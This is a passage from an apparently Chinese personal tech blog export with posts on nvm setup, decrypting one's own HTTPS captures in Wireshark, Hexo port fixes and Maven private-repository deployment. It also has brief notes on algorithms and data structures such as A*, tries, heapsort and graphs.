 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;nvm</span><br><span class="line"></span><br><span class="line">Running version 1.1.9.</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line"></span><br><span class="line">  nvm arch                     : Show <span class="keyword">if</span> node is running <span class="keyword">in</span> 32 or 64 bit mode.</span><br><span class="line">  nvm current                  : Display active version.</span><br><span class="line">  nvm install &lt;version&gt; [arch] : The version can be a specific version, <span class="string">"latest"</span> <span class="keyword">for</span> the latest current version, or <span class="string">"lts"</span> <span class="keyword">for</span> the</span><br><span class="line">                                 most recent LTS version. Optionally specify whether to install the 32 or 64 bit version (defaults</span><br><span class="line">                                 to system arch). Set [arch] to <span class="string">"all"</span> to install 32 AND 64 bit versions.</span><br><span class="line">                                 Add --insecure to the end of this <span class="built_in">command</span> to bypass SSL validation of the remote download server.</span><br><span class="line">  nvm list [available]         : List the node.js installations. Type <span class="string">"available"</span> at the end to see what can be installed. Aliased as ls.</span><br><span class="line">  nvm on                       : Enable node.js version management.</span><br><span class="line">  nvm off                      : Disable node.js version management.</span><br><span class="line">  nvm proxy [url]              : Set a proxy to use <span class="keyword">for</span> downloads. Leave [url] blank to see the current proxy.</span><br><span class="line">                                 Set [url] to <span class="string">"none"</span> to remove the proxy.</span><br><span class="line">  nvm node_mirror [url]        : Set the node mirror. Defaults to https://nodejs.org/dist/. Leave [url] blank to use default url.</span><br><span class="line">  nvm npm_mirror [url]         : Set the npm mirror. Defaults to https://github.com/npm/cli/archive/. Leave [url] blank to default url.</span><br><span class="line">  nvm uninstall &lt;version&gt;      : The version must be a specific version.</span><br><span class="line">  nvm use [version] [arch]     : Switch to use the specified version. Optionally use <span class="string">"latest"</span>, <span class="string">"lts"</span>, or <span class="string">"newest"</span>.</span><br><span class="line">                                 <span class="string">"newest"</span> is the latest installed version. Optionally specify 32/64bit architecture.</span><br><span class="line">                                 nvm use &lt;arch&gt; will <span class="built_in">continue</span> using the selected version, but switch to 32/64 bit mode.</span><br><span class="line">  nvm root [path]              : Set the directory <span class="built_in">where</span> nvm should store different versions of node.js.</span><br><span class="line">                                 If &lt;path&gt; is not <span class="built_in">set</span>, the current root will be displayed.</span><br><span class="line">  nvm version                  : Displays the current running version of nvm <span class="keyword">for</span> Windows. Aliased as v.</span><br></pre></td></tr></table></figure>
<p>由于nvm安装node相当慢,配置一下镜像，在settings.txt中<br>加上镜像配置信息.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node_mirror: https://npm.taobao.org/mirrors/node</span><br><span class="line">npm_mirror: https://npm.taobao.org/mirrors/npm</span><br></pre></td></tr></table></figure>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><blockquote>
<ol>
<li>exit status 145: 目录不是空的</li>
</ol>
</blockquote>
<p>执行 <code>nvm use</code>切换版本的时候，报这个错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span> status 145: 目录不是空的。</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> status 1: 当文件已存在时，无法创建该文件。</span><br></pre></td></tr></table></figure>
<p>NVM_SYMLINK 环境变量配置的目录要和settings.txt中path一致。</p>
<blockquote>
<ol>
<li>包下载失败</li>
</ol>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Downloading npm version 6.9.0… Download failed. Rolling Back.</span><br><span class="line">Rollback failed. remove E:\tools\nvm  .zip: The process cannot access the file because it is being used by another process.</span><br><span class="line">Could not download npm for node v12.22.1.</span><br></pre></td></tr></table></figure>
<p>直接从官网下载对应的包,解压到nvm指定目录里,修改文件夹名字为对应的版本号,如: v12.22.1。</p>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>nvm</tag>
      </tags>
  </entry>
  <entry>
    <title>wireshark抓取并解密https数据包</title>
    <url>/2019/02/20/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/wireshark%E6%8A%93%E5%8F%96%E5%B9%B6%E8%A7%A3%E5%AF%86https%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
    <content><![CDATA[<p>wireshark抓取https的数据包不做任何配置的话抓取到数数据包全部是加密的TLSv1.2协议的数据包。需要配置一下来解析数据包,在此记录一下。</p>
<h1 id="配置环境变量-windows"><a href="#配置环境变量-windows" class="headerlink" title="配置环境变量(windows)"></a>配置环境变量(windows)</h1><p>创建对应的文件并配置系统环境变量,变量名为”SSLKEYLOGFILE”,变量值是导出的密钥具体文件地址。<br><img src="/2019/02/20/开发工具/wireshark抓取并解密https数据包/system_variables_20190220104202.png" alt></p>
<h1 id="wireshark-配置SSL"><a href="#wireshark-配置SSL" class="headerlink" title="wireshark 配置SSL"></a>wireshark 配置SSL</h1><p>wireshark中配置上边环境变量中配置的文件路径。</p>
<p>Edit -&gt; preferences -&gt; Protocols -&gt; SSL </p>
<p><img src="/2019/02/20/开发工具/wireshark抓取并解密https数据包/wireshark_20190220103905.png" alt></p>
<h1 id="wireshark-抓包"><a href="#wireshark-抓包" class="headerlink" title="wireshark 抓包"></a>wireshark 抓包</h1><p>开始抓取https数据包,正常的话会解密数据包,可以看到有HTTP请求了。</p>
<p><img src="/2019/02/20/开发工具/wireshark抓取并解密https数据包/wireshark_20190220104956.png" alt></p>
<p>查看对应的SSL stream</p>
<p><img src="/2019/02/20/开发工具/wireshark抓取并解密https数据包/wireshark_ssl_stream_20190220105654.png" alt></p>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo启动成功但是无法访问</title>
    <url>/2018/07/22/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/hexo%E5%90%AF%E5%8A%A8%E6%88%90%E5%8A%9F%E4%BD%86%E6%98%AF%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<p>hexo s 启动本地服务后,无法访问。</p>
<blockquote>
<ul>
<li>杀掉进程<br>查看默认的4000端口被别的应用程序占用,window可能是Fixservice(福昕阅读器)。</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -ano|findstr 4000</span><br></pre></td></tr></table></figure>
<p>强制杀掉指定PID的进程<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">taskkill /PID 8896 /F</span><br></pre></td></tr></table></figure></p>
<blockquote>
<ul>
<li>修改端口</li>
</ul>
</blockquote>
<p>默认使用4000端口，用hexo s -p 8080，可以暂时修改启动端口。</p>
<p>但是每次启动都要写”-p 80”才行，过于繁琐。</p>
<p>修改方法：<br>找到node_modules\hexo-server\index.js文件，可以修改默认的port值！</p>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>上传本地jar到maven私有库</title>
    <url>/2017/10/24/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0jar%E5%88%B0maven%E7%A7%81%E6%9C%89%E5%BA%93/</url>
    <content><![CDATA[<blockquote>
<h1 id="1-java-maven环境变量配置-maven-私服安装"><a href="#1-java-maven环境变量配置-maven-私服安装" class="headerlink" title="1. java maven环境变量配置,maven 私服安装"></a>1. java maven环境变量配置,maven 私服安装</h1></blockquote>
<p>   忽略</p>
<blockquote>
<h1 id="2-setting中配置nexus服务器信息"><a href="#2-setting中配置nexus服务器信息" class="headerlink" title="2.  setting中配置nexus服务器信息"></a>2.  setting中配置nexus服务器信息</h1></blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">id</span>&gt;</span>phshopping<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h6 id="id-服务id"><a href="#id-服务id" class="headerlink" title="id: 服务id"></a>id: 服务id</h6><h6 id="username-登陆maven私服的用户名"><a href="#username-登陆maven私服的用户名" class="headerlink" title="username: 登陆maven私服的用户名"></a>username: 登陆maven私服的用户名</h6><h6 id="password-登陆maven私服的密码"><a href="#password-登陆maven私服的密码" class="headerlink" title="password: 登陆maven私服的密码"></a>password: 登陆maven私服的密码</h6><blockquote>
<h1 id="3-上传jar到maven私服"><a href="#3-上传jar到maven私服" class="headerlink" title="3.  上传jar到maven私服"></a>3.  上传jar到maven私服</h1></blockquote>
<p>切换到要上传jar的目录,执行maven 命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn deploy:deploy-file -DgroupId=com.ph.shopping -DartifactId=deliver-api -Dversion=1.0.0 -Dpackaging=jar -Dfile=deliver-api-1.0.jar -Durl=http://localhost:8081/repository/shopping/ -DrepositoryId=puhuishopping</span><br></pre></td></tr></table></figure></p>
<h6 id="DgroupId-是项目组织唯一的标识符，实际对应JAVA的包的结构，是main目录里java的目录结构。-对应maven中的配置groupId。"><a href="#DgroupId-是项目组织唯一的标识符，实际对应JAVA的包的结构，是main目录里java的目录结构。-对应maven中的配置groupId。" class="headerlink" title="DgroupId: 是项目组织唯一的标识符，实际对应JAVA的包的结构，是main目录里java的目录结构。 对应maven中的配置groupId。"></a>DgroupId: 是项目组织唯一的标识符，实际对应JAVA的包的结构，是main目录里java的目录结构。 对应maven中的配置groupId。</h6><h6 id="DartifactId-项目的唯一的标识符，实际对应项目的名称，就是项目根目录的名称。-对应maven中的配置artifactId"><a href="#DartifactId-项目的唯一的标识符，实际对应项目的名称，就是项目根目录的名称。-对应maven中的配置artifactId" class="headerlink" title="DartifactId :  项目的唯一的标识符，实际对应项目的名称，就是项目根目录的名称。 对应maven中的配置artifactId"></a>DartifactId :  项目的唯一的标识符，实际对应项目的名称，就是项目根目录的名称。 对应maven中的配置artifactId</h6><h6 id="Dversion：-jar的版本信息"><a href="#Dversion：-jar的版本信息" class="headerlink" title="Dversion： jar的版本信息"></a>Dversion： jar的版本信息</h6><h6 id="Dfile-：-待上传目录中的文件名字"><a href="#Dfile-：-待上传目录中的文件名字" class="headerlink" title="Dfile  ： 待上传目录中的文件名字"></a>Dfile  ： 待上传目录中的文件名字</h6><h6 id="Durl-：-远程的仓库地址"><a href="#Durl-：-远程的仓库地址" class="headerlink" title="Durl ： 远程的仓库地址"></a>Durl ： 远程的仓库地址</h6><h6 id="DrepositoryId：-对应maven-setting中配置的server-id"><a href="#DrepositoryId：-对应maven-setting中配置的server-id" class="headerlink" title="DrepositoryId： 对应maven setting中配置的server id"></a>DrepositoryId： 对应maven setting中配置的server id</h6><blockquote>
<h1 id="4-nexus控制台查看"><a href="#4-nexus控制台查看" class="headerlink" title="4.nexus控制台查看"></a>4.nexus控制台查看</h1></blockquote>
<p><img src="https://i.imgur.com/uOkPbeJ.png" alt></p>
<blockquote>
<h1 id="5-使用方式"><a href="#5-使用方式" class="headerlink" title="5. 使用方式"></a>5. 使用方式</h1></blockquote>
<ul>
<li>5.1  maven项目pom.xml配置私有仓库地址<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">id</span>&gt;</span>phshopping<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://localhsot:8081/repository/phshopping<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li>5.2 引入需要依赖的jar<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>tk.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mapper-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title>A*搜索算法</title>
    <url>/2019/04/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/A%20star%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>在计算机科学中，A <em>（发音为“A star”）是一种计算机算法，广泛用于寻路和图遍历，这是在多个点（称为“节点”）之间寻找路径的过程。<br>由于其性能和准确性，它得到广泛使用。<br>然而，在实际的旅行路线系统中，它通常优于可以预处理图形以获得更好性能的算法，尽管其他工作已经发现A </em>优于其他方法.<br>斯坦福研究所（现为SRI国际）的Peter Hart，Nils Nilsson和Bertram Raphael于1968年首次发布该算法.<br>它可以看作是Edsger Dijkstra 1959年算法的延伸。<br>A *通过使用启发式方法来指导其搜索，从而实现更好的性能。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://en.wikipedia.org/wiki/A*_search_algorithm" target="_blank" rel="noopener">A*_search_algorithm</a></li>
<li><a href="https://ieeexplore.ieee.org/document/4082128" target="_blank" rel="noopener">A Formal Basis for the Heuristic Determination of Minimum Cost Paths</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>A*</tag>
      </tags>
  </entry>
  <entry>
    <title>AC自动机算法详解</title>
    <url>/2019/05/12/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>Aho-Corasick automaton，该算法在1975年产生于贝尔实验室，是著名的多模匹配算法。<br>要学会AC自动机，我们必须知道什么是Trie，也就是字典树。Trie树，又称单词查找树或键树，是一种树形结构，是一种哈希树的变种。典型应用是用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。<br><a id="more"></a></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://www.cnblogs.com/cmmdc/p/7337611.html" target="_blank" rel="noopener">AC自动机算法详解</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>AC</tag>
      </tags>
  </entry>
  <entry>
    <title>trie树</title>
    <url>/2019/03/31/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/trie%E6%A0%91/</url>
    <content><![CDATA[<h1 id="简介-wiki"><a href="#简介-wiki" class="headerlink" title="简介[wiki]"></a>简介[wiki]</h1><p>在计算机科学中，trie，又称前缀树或字典树，是一种有序树，用于保存关联数组，其中的键通常是字符串。与二叉查找树不同，键不是直接保存在节点中，而是由节点在树中的位置决定。一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。</p>
<p>Trie这个术语来自于retrieval。根据词源学，trie的发明者Edward Fredkin把它读作/ˈtriː/ “tree”。但是，其他作者把它读作/ˈtraɪ/ “try”。</p>
<p><img src="/2019/03/31/数据结构和算法/trie树/Trie_example.svg" alt="一个保存了8个键的trie结构，&quot;A&quot;, &quot;to&quot;, &quot;tea&quot;, &quot;ted&quot;, &quot;ten&quot;, &quot;i&quot;, &quot;in&quot;, and &quot;inn&quot;."></p>
<p>在图示中，键标注在节点中，值标注在节点之下。每一个完整的英文单词对应一个特定的整数。Trie可以看作是一个确定有限状态自动机，尽管边上的符号一般是隐含在分支的顺序中的。</p>
<p>键不需要被显式地保存在节点中。图示中标注出完整的单词，只是为了演示trie的原理。</p>
<p>trie中的键通常是字符串，但也可以是其它的结构。trie的算法可以很容易地修改为处理其它结构的有序序列，比如一串数字或者形状的排列。比如，bitwise trie中的键是一串比特，可以用于表示整数或者内存地址。<br><a id="more"></a></p>
<p><img src="/2019/03/31/数据结构和算法/trie树/tree_20190331182733.png" alt="计算机中相关的树"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Trie" target="_blank" rel="noopener">Trie</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>trie</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构(4):栈和队列</title>
    <url>/2017/11/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84(4)%E3%80%81%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>数据结构和算法</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构(3):线性表</title>
    <url>/2017/11/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84(3)%E3%80%81%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    <content><![CDATA[<p>线性表是最基本、最简单、也是最常用的一种数据结构。在线性表中数据元素之间的关系是线性，数据元素可以看成是排列在一条线上或一个环上。<br>线性表分为静态线性表和动态线性表，常见的有顺序表(静态的)、单向链表(动态的)和双向链表(动态的)。<br>…未完待续</p>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>数据结构和算法</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构(5):串</title>
    <url>/2017/11/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84(5)%E3%80%81%E4%B8%B2/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>数据结构和算法</tag>
      </tags>
  </entry>
  <entry>
    <title>堆排序</title>
    <url>/2019/05/12/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/%E5%A0%86%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<p>堆排序（英语：Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。<br><a id="more"></a></p>
<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>二叉堆是一个数组,可以被看成是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。<br>如下图所示，就是一个典型的二叉堆,可以用数组[2,4,13,10,9,32,35,12,31,11]表示.<br><img src="/2019/05/12/数据结构和算法/堆排序/heap.png" alt></p>
<p>根据父节点和子节点的关系，可以分为大顶堆和小顶堆。</p>
<h2 id="大顶堆"><a href="#大顶堆" class="headerlink" title="大顶堆"></a>大顶堆</h2><p>父节点比它的子节点大.</p>
<h2 id="小顶堆"><a href="#小顶堆" class="headerlink" title="小顶堆"></a>小顶堆</h2><p>父节点比它的子节点小.</p>
<p>如上图所示就是一个小顶堆.</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Heapsort" target="_blank" rel="noopener">Heapsort</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>heapsort</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构(1):数据结构基础</title>
    <url>/2017/11/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84(1)%E3%80%81%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<blockquote>
<p>一、概述</p>
</blockquote>
<p>在计算机科学中，数据结构（英语：data structure）是计算机中存储、组织数据的方式。<br>数据结构意味着接口或封装：一个数据结构可被视为两个函数之间的接口，或者是由数据类型联合组成的存储内容的访问方法封装。<br>大多数数据结构都由数列、记录、可辨识联合、引用等基本类型构成。举例而言，可为空的引用（nullable reference）是引用与可辨识联合的结合体，而最简单的链式结构链表则是由记录与可空引用构成。</p>
<blockquote>
<p>二、基本概念</p>
</blockquote>
<p><strong>数据（Data)</strong></p>
<pre><code>　数据是信息的载体。它能够被计算机识别、存储和加工处理，是计算机程序加工的&quot;原料&quot;。
　随着计算机应用领域的扩大，数据的范畴包括：整数、实数、字符串、图像和声音等。
</code></pre><p><strong>数据元素（Data Element）</strong></p>
<pre><code>　数据元素是数据的基本单位。数据元素也称元素、结点、顶点、记录。
　一个数据元素可以由若干个数据项（也可称为字段、域、属性）组成。
　数据项是具有独立含义的最小标识单位。
　
</code></pre><p><strong>数据项</strong></p>
<p>一个数据元素可以由多个数据项组成。数据项是数据不可分割的最小单位。</p>
<p><strong>数据对象</strong></p>
<p>数据对象是性质相同的数据元素的集合,是数据的子集。</p>
<p><strong>数据结构（Data Structure）</strong></p>
<pre><code>　数据结构指的是数据之间的相互关系，即数据的组织形式。
</code></pre><p>1．数据结构一般包括以下三方面内容：</p>
<p>① 数据元素之间的逻辑关系，也称数据的逻辑结构（Logical Structure）；<br>    　数据的逻辑结构是从逻辑关系上描述数据，与数据的存储无关，是独立于计算机的。数据的逻辑结构可以看作是从具体问题抽象出来的数学模型。</p>
<p>② 数据元素及其关系在计算机存储器内的表示，称为数据的存储结构（Storage Structure）；<br>    　数据的存储结构是逻辑结构用计算机语言的实现（亦称为映象），它依赖于计算机语言。对机器语言而言，存储结构是具体的。一般，只在高级语言的层次上讨论存储结构。</p>
<p>③ 数据的运算，即对数据施加的操作。<br>数据的运算定义在数据的逻辑结构上，每种逻辑结构都有一个运算的集合。最常用的检索、插入、删除、更新、排序等运算实际上只是在抽象的数据上所施加的一系列抽象的操作。<br>所谓抽象的操作，是指我们只知道这些操作是”做什么”，而无须考虑”如何做”。只有确定了存储结构之后，才考虑如何具体实现这些运算。</p>
<blockquote>
<p>三、分类</p>
</blockquote>
<p>按照视点不同,数据结构可以分为逻辑结构和物理结构。</p>
<p><strong>逻辑结构</strong><br>　<br>　逻辑结构是数据对象中数据元素的关系。逻辑结构可以分为以下几种:
　</p>
<blockquote>
<h6 id="1-集合结构"><a href="#1-集合结构" class="headerlink" title="1. 集合结构　"></a>1. 集合结构　</h6></blockquote>
<p>数据结构中纯集合结构指的是在数据元素之间除了“同属一个集合”之外，别无其他关系。</p>
<p><img src="https://i.imgur.com/H19pDFR.png" alt></p>
<blockquote>
<h6 id="2-线性结构"><a href="#2-线性结构" class="headerlink" title="2. 线性结构　"></a>2. 线性结构　</h6></blockquote>
<p>数据结构中线性结构指的是数据元素之间存在着“一对一”的线性关系的数据结构。线性结构是一个有序数据元素的集合常用的线性结构有：线性表，栈，队列，双队列，数组，串。</p>
<p><img src="https://i.imgur.com/zxM0brM.png" alt></p>
<blockquote>
<h6 id="3-树结构"><a href="#3-树结构" class="headerlink" title="3. 树结构　"></a>3. 树结构　</h6></blockquote>
<p>树是一种重要的非线性数据结构，直观地看，它是数据元素（在树中称为结点）按分支关系组织起来的结构，很象自然界中的树那样。树结构在客观世界中广泛存在，如人类社会的族谱和各种社会组织机构都可用树形象表示。树在计算机领域中也得到广泛应用，如在编译源程序如下时，可用树表示源源程序如下的语法结构。又如在数据库系统中，树型结构也是信息的重要组织形式之一。一切具有层次关系的问题都可用树来描述。</p>
<p><img src="https://i.imgur.com/mwCePmu.png" alt></p>
<blockquote>
<h6 id="4-图结构"><a href="#4-图结构" class="headerlink" title="4. 图结构　"></a>4. 图结构　</h6></blockquote>
<p>图形结构，简称“图”，是一种复杂的数据结构。图形结构中，每个结点的前驱结点数和后续结点数可以任意多个。数据元素间的关系是任意的。其他数据结构(如树、线性表等)都有明确的条件限制，而图形结构中任意两个数据元素间均可相关联。常用来研究生产流程、施工计划、各种网络建设等问题。</p>
<p><img src="https://i.imgur.com/TuObRBy.png" alt></p>
<p><strong>物理结构</strong>
　</p>
<blockquote>
<h6 id="顺序存储结构"><a href="#顺序存储结构" class="headerlink" title="顺序存储结构"></a>顺序存储结构</h6></blockquote>
<p>在计算机中用一组地址连续的存储单元依次存储线性表的各个数据元素,称作线性表的顺序存储结构。<br>由此得到的存储结构为顺序存储结构，通常顺序存储结构是借助于计算机程序设计语言（例如c/c++）的数组来描述的。<br>顺序存储结构的主要优点是节省存储空间，因为分配给数据的存储单元全用存放结点的数据（不考虑c/c++语言中数组需指定大小的情况），结点之间的逻辑关系没有占用额外的存储空间。采用这种方法时，可实现对结点的随机存取，即每一个结点对应一个序号，由该序号可以直接计算出来结点的存储地址。但顺序存储方法的主要缺点是不便于修改，对结点的插入、删除运算时，可能要移动一系列的结点。<br>优点：随机存取表中元素。缺点：插入和删除操作需要移动元素。</p>
<blockquote>
<h6 id="链式存储结构"><a href="#链式存储结构" class="headerlink" title="链式存储结构"></a>链式存储结构</h6></blockquote>
<p>链式存储结构，又叫链接存储结构。在计算机中用一组任意的存储单元存储线性表的数据元素(这组存储单元可以是连续的,也可以是不连续的).</p>
<p>一般在计算机的硬盘中，文件都是链式存储的。我们知道，多个扇区组成一个簇，簇是计算机存储数据的基本单位。而一个文件是存储在多个在空间上也许并不相连的簇中的。这就是链式存储。但是为了能够读取出这个文件，计算机会在该文件第一部分的尾部写上第二部分所在的簇号。第二部分的尾部又写上第三部分，以此类推，最后一部分写上一段代码，表示这是该文件的最后一部分。值得一提的是，高簇号在后。（如代码所示的1234实为簇3412）文件所占簇可认为是随机分配的。</p>
<p>链式存储结构特点：<br>1、比顺序存储结构的存储密度小(链式存储结构中每个结点都由数据域与指针域两部分组成，相比顺序存储结构增加了存储空间)。<br>2、逻辑上相邻的节点物理上不必相邻。<br>3、插入、删除灵活 (不必移动节点，只要改变节点中的指针)。<br>4、查找结点时链式存储要比顺序存储慢。<br>5、每个结点是由数据域和指针域组成。<br>6、由于簇是随机分配的，这也使数据删除后覆盖几率降低，恢复可能提高。</p>
<blockquote>
<p>四、抽象数据类型</p>
</blockquote>
<p>抽象数据类型(Abstract Data Type 简称ADT)是指一个数学模型以及定义在此数学模型上的一组操作。抽象数据类型需要通过固有数据类型（高级编程语言中已实现的数据类型）来实现。抽象数据类型是与表示无关的数据类型，是一个数据模型及定义在该模型上的一组运算。对一个抽象数据类型进行定义时，必须给出它的名字及各运算的运算符名，即函数名，并且规定这些函数的参数性质。一旦定义了一个抽象数据类型及具体实现，程序设计中就可以像使用基本数据类型那样，十分方便地使用抽象数据类型。</p>
<p>参考资料:</p>
<blockquote>
<ul>
<li>算法导论</li>
<li>大话数据结构</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>数据结构和算法</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构(7)、图</title>
    <url>/2017/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84(7)%E3%80%81%E5%9B%BE/</url>
    <content><![CDATA[<p>在数学的分支图论中，图（Graph）用于表示物件与物件之间的关系，是图论的基本研究对象。一张图由一些小圆点（称为顶点或结点）和连结这些圆点的直线或曲线（称为边）组成。西尔维斯特在1878年首次提出“图”这一名词。</p>
<blockquote>
<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1></blockquote>
<p>图有多种变体，包括简单图、多重图、有向图、无向图等，但大体上有以下两种定义方式。</p>
<blockquote>
<ul>
<li>二元组的定义</li>
</ul>
</blockquote>
<p>一张图 G 是一个二元组(V,E)，其中 V称为顶点集，  E称为边集。它们亦可写成 V(G) 和 E(G) 。 E的元素是一个二元组数对，用 (x,y)表示，其中 <script type="math/tex">x,y \in V</script>。</p>
<blockquote>
<ul>
<li>三元组的定义</li>
</ul>
</blockquote>
